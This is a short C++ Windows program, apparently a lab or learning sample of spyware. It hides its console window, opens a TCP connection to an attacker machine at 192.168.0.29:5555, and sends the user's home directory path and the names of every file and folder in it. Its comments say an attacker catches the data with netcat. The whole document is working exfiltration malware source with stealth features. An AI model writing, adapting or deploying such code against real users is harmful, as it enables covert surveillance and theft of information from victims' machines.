#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

/* 
- gets a list of files and folders in a host user's home directory 
- then sends this list to an attacker listening on a remote machine 
- attacker can use netcat to listen for this connection 
*/

// returns the user home directory path
char* userDirectory() {
    // pointer for path variable 
    char* pPath;
    // get user's path
    pPath = getenv ("USERPROFILE");
    if (pPath!=NULL) {
        return pPath;
    } else {
        perror("");
    }
}

int main() {
    // hide terminal window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // for socket variables
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    // create a socket for sending data back to attack machine
    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);
    // attack machine IP
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
    // IPv4
    addr.sin_family = AF_INET;
    // port attack machine listening on (i.e. with netcat)
    addr.sin_port = htons(5555);
    // make connection
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    // get the users current directory (using function)
    char* pPath = userDirectory();
    send(server, pPath, sizeof(pPath), 0);

    // read all the folders and files in the user's home directory
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir (pPath)) != NULL) {
        while ((ent = readdir (dir)) != NULL) {
            //send all the folder/file names to attacker
            send(server, ent->d_name, sizeof(ent->d_name), 0);
        }
        closedir (dir);
    } else {
        perror ("");
    }

    // close connection
    closesocket(server);
    WSACleanup();
}